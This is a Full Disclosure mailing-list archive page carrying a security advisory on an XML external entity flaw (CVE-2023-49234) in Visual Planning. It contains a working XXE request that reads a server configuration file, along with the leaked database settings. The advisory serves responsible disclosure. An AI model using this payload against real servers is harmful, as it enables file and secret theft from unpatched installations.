<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in Visual Planning"/>
<meta name="Author" content="Lennert Preuth via Fulldisclosure"/>
<title>Full Disclosure: SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in Visual Planning</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="2"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#3">By Date</a>
<a href="6"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="2"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#3">By Thread</a>
<a href="6"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in Visual Planning</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: Lennert Preuth via Fulldisclosure &lt;fulldisclosure () seclists org&gt;<br>

<em>Date</em>: Wed, 3 Apr 2024 17:13:41 +0200<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Title
=====

</pre><tt>SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in 
</tt><tt>Visual Planning
</tt><pre style="margin: 0em;">

Status
======

PUBLISHED

Version
=======

1.0

CVE reference
=============

CVE-2023-49234

Link
====

<a  rel="nofollow" href="https://www.schutzwerk.com/advisories/schutzwerk-sa-2023-006/">https://www.schutzwerk.com/advisories/schutzwerk-sa-2023-006/</a>

Text-only version:
<a  rel="nofollow" href="https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-006.txt">https://www.schutzwerk.com/advisories/SCHUTZWERK-SA-2023-006.txt</a>

Affected products/vendor
========================

All versions prior to Visual Planning 8 (Build 240207) by STILOG I.S.T.

Summary
=======

</pre><tt>Authenticated attackers can exploit a weakness in the XML parser 
</tt><tt>functionality of the Visual Planning[0] application in order to obtain 
</tt><tt>read access to arbitrary files on the application server. Depending on 
</tt><tt>configured access permissions, this vulnerability could be used by an 
</tt><tt>attacker to exfiltrate secrets stored on the local file system.
</tt><pre style="margin: 0em;">

Risk
====

</pre><tt>An attacker can use the vulnerability to gather information and 
</tt><tt>depending on the stored data, exfiltrate secrets from the file system. 
</tt><tt>Furthermore, HTTP requests can be used for out-of-bands exfiltration and 
</tt><tt>possibly server side request forgery (SSRF) attacks.
</tt><pre style="margin: 0em;">

Description
===========

</pre><tt>During a recent red teaming assessment, Visual Planning was identified 
</tt><tt>as part of the customers internet-facing assets. The software is 
</tt><tt>developed by STILOG I.S.T. and provides resource management and 
</tt><tt>scheduling features. A security assessment conducted by SCHUTZWERK found 
</tt><tt>an arbitrary file read vulnerability via XML external entities in Visual 
</tt><tt>Planning.
</tt><tt>The application Admin Center (vpadmin) communicates with the server 
</tt><tt>through an XML-based protocol that utilizes proprietary compression 
</tt><tt>methods and is transmitted via HTTP. SCHUTZWERK implemented a custom 
</tt><tt>proxy as part of an assessment in order to intercept and manipulate the 
</tt><tt>messages exchanged between application and server.
</tt><pre style="margin: 0em;">

</pre><tt>One of the messages sent by the Admin Center application after 
</tt><tt>authentication is the following:
</tt><pre style="margin: 0em;">

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;com.visualplanning.query.parameters.GetApplicationProperty&gt;
&lt;defaultValue&gt;

&lt;/defaultValue&gt;
&lt;propertyName&gt;PWD&lt;/propertyName&gt;
&lt;rawResult&gt;false&lt;/rawResult&gt;
&lt;section&gt;INSTALLDATA&lt;/section&gt;
&lt;userSession isNull=&quot;true&quot;/&gt;
&lt;/com.visualplanning.query.parameters.GetApplicationProperty&gt;

</pre><tt>The method GetApplicationProperty is called to request the value of the 
</tt><tt>property PWD. The server responds with an XML message, where the value 
</tt><tt>element contains the response of the query:
</tt><pre style="margin: 0em;">

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;com.visualplanning.query.result.ApplicationPropertyResult&gt;
&lt;resultValues/&gt;
&lt;status&gt;OK&lt;/status&gt;
&lt;value&gt;

&lt;/value&gt;
&lt;/com.visualplanning.query.result.ApplicationPropertyResult&gt;

</pre><tt>In this response it was observed that if the requested property value 
</tt><tt>could not be resolved, the content of the request element defaultValue 
</tt><tt>will be reflected as part of the response, making it a suitable back 
</tt><tt>channel for XML external entity (XXE) injections.
</tt><pre style="margin: 0em;">

The following message was sent to the Visual Planning application:

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
</pre><tt>&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM 
</tt><tt>&quot;C:\xampp2\tomcat\webapps\vplanning\configuration\install.properties&quot;&gt; ]&gt;
</tt><pre style="margin: 0em;">
&lt;com.visualplanning.query.parameters.GetApplicationProperty&gt;
&lt;defaultValue&gt;&amp;example;&lt;/defaultValue&gt;
&lt;propertyName&gt;ShowBackground&lt;/propertyName&gt;
&lt;rawResult&gt;false&lt;/rawResult&gt;
&lt;section&gt;Application&lt;/section&gt;
&lt;userSession isNull=&quot;true&quot;/&gt;
&lt;/com.visualplanning.query.parameters.GetApplicationProperty&gt;

</pre><tt>The server responds with the content of the requested install.properties 
</tt><tt>file inside the value element, thus confirming the XML parser is 
</tt><tt>vulnerable to XML external entity (XXE) injections:
</tt><pre style="margin: 0em;">

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;com.visualplanning.query.result.ApplicationPropertyResult&gt;
&lt;resultValues/&gt;
&lt;status&gt;OK&lt;/status&gt;
&lt;value&gt;#
#Tue Oct 03 15:37:33 CEST 2023
INSTALLDATA.INSTALLSERIAL=
INSTALLDATA.INSTALLURL=http\://127.0.0.1\:8080/vplanning
INSTALLDATA.OK=Next
INSTALLDATA.PAGE=PROVIDER
INSTALLDATA.POOLMODE=1
INSTALLDATA.PORT=3306
INSTALLDATA.PROVIDERTYPE=MySQL
INSTALLDATA.PWD=ENCODE\:
INSTALLDATA.SERVER=127.0.0.1
INSTALLDATA.SERVERLANG=de
INSTALLDATA.USER=root
INSTALLDATA.VIEWERSERIAL=
&lt;/value&gt;
&lt;/com.visualplanning.query.result.ApplicationPropertyResult&gt;

</pre><tt>Further testing showed that out-of-bands exfiltration via HTTPS requests 
</tt><tt>is also generally possible.
</tt><pre style="margin: 0em;">

Solution/Mitigation
===================

The vendor suggests to update to Visual Planning 8 (Build 240207)

Disclosure timeline
===================

2023-11-01: Vulnerability discovered
2023-11-09: Contact vendor in order to determine security contact
2023-11-10: Received generic sales response from vendor
2023-11-14: Contacted CTO of vendor directly
2023-11-16: Vulnerabilities demonstrated in call with contact at vendor
2023-11-24: CVE assigned by Mitre
2023-11-24: Additional technical details provided to vendor
</pre><tt>2023-12-19: Vendor informed SCHUTZWERK that work on fixing the findings 
</tt><tt>is in progress
</tt><tt>2024-01-30: Inquired about mitigation status regarding the reported 
</tt><tt>vulnerabilities
</tt><tt>2024-01-30: Vendor informed SCHUTZWERK that some of the issues were 
</tt><tt>already fixed
</tt><pre style="margin: 0em;">
2024-03-08: Sent advisory drafts to vendor
2024-03-28: Received patch information and release of advisory

Contact/Credits
===============

</pre><tt>The vulnerability was discovered during an assessment by Lennert Preuth 
</tt><tt>and David Brown of SCHUTZWERK GmbH.
</tt><pre style="margin: 0em;">

References
==========

[0] <a  rel="nofollow" href="https://www.visual-planning.com/en/">https://www.visual-planning.com/en/</a>

Disclaimer
==========

</pre><tt>The information provided in this security advisory is provided &quot;as is&quot; 
</tt><tt>and without warranty of any kind. Details of this security advisory may 
</tt><tt>be updated in order to provide as accurate information as possible. The 
</tt><tt>most recent version of this security advisory can be found at SCHUTZWERK 
</tt><tt>GmbH&apos;s website ( <a  rel="nofollow" href="https://www.schutzwerk.com">https://www.schutzwerk.com</a> ).
</tt><pre style="margin: 0em;">

Additional information
======================

SCHUTZWERK Advisories: <a  rel="nofollow" href="https://www.schutzwerk.com/blog/tags/advisories/">https://www.schutzwerk.com/blog/tags/advisories/</a>

SCHUTZWERK Advisory Policy: <a  rel="nofollow" href="https://www.schutzwerk.com/en/advisories/">https://www.schutzwerk.com/en/advisories/</a>
-----BEGIN PGP SIGNATURE-----

iQJOBAEBCgA4FiEEgLsg7Oj/wY3LSF87GrXfkTIXLrsFAmYF0bcaHGFkdmlzb3Jp
ZXNAc2NodXR6d2Vyay5jb20ACgkQGrXfkTIXLrsdwA/+MyfbZTe36+AYi9q6GJE6
S75Xm2aZtEM3NC5F6aMcELqFEW7LNjERmBoqfkHe+SWfgFxeCXl/XelHaNnR7HTM
ZZPCGwJmOI+XaraInPVdCDw1QVIdiCG4VZzE0tlnFbLBgM+OTOxcDOoG7OhzP6mm
ALfankzxu3AfbZhwebQtSXIQ+YqjitTsvjQGPleylqYK5CJbChsyvmMjomu/GzdO
sWQ25ODCVUy6VORet8yn5OkQnM2CjSkteuTdNxCzd6JUB+vQ0g5FCE5NVzkqYq21
YJ4Fc3PgkyAnrGefSbueL+Z/K6btM8RysJAwGahIEOdlkG8W/p09L0QQUGERT2VN
UO6oTi/1OyoJBV9L5umr6aHss3P92ln90UAUW2dlZOdGSB8rlXisxLC1wtFZAXH9
YwiGY/ACXmV1FtQQpgFxfNRyEWaltU5S0Y0bPAaW+ABSMLlK4X0Ft9E/4s4Yel2d
TGngEnVKcR/PKNtrJbBqPDwt98R0MdQi0QxBRaxGxAg4Yr1qex8ph6IRT7bDTm0/
1CKlQL7y9uvXlnFE4CO3IkKNp0ejKn3A7QEep4jit07VItIc+sRsoMnB6v54DoML
ZfIisDoijb3doTNieyMpgTGZTDWLwLO36IS9JiqafNCAnngExqylFX6vYQVggtRz
mZ2yA2/9ZfQwOawEirQtQr8=
=TUGM
-----END PGP SIGNATURE-----

--
SCHUTZWERK GmbH, Pfarrer-Weiß-Weg 12, 89077 Ulm, Germany
Zertifiziert / Certified ISO 27001, 9001 and TISAX

Phone +49 731 977 191 0

advisories () schutzwerk com / www.schutzwerk.com

Geschäftsführer / Managing Directors:
Jakob Pietzka, Michael Schäfer

Amtsgericht Ulm / HRB 727391
Datenschutz / Data Protection www.schutzwerk.com/datenschutz
</pre><p><strong>Attachment:
<a href="att-3/OpenPGP_signature_asc.bin" ><tt>OpenPGP_signature.asc</tt></a></strong><br>
<em>Description:</em> OpenPGP digital signature</p>
<pre style="margin: 0em;">_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="https://seclists.org/fulldisclosure/">https://seclists.org/fulldisclosure/</a></pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="2"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#3">By Date</a>
<a href="6"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="2"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#3">By Thread</a>
<a href="6"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>SCHUTZWERK-SA-2023-006: Arbitrary File Read via XML External Entities in Visual Planning</strong> <em>Lennert Preuth via Fulldisclosure (Apr 05)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

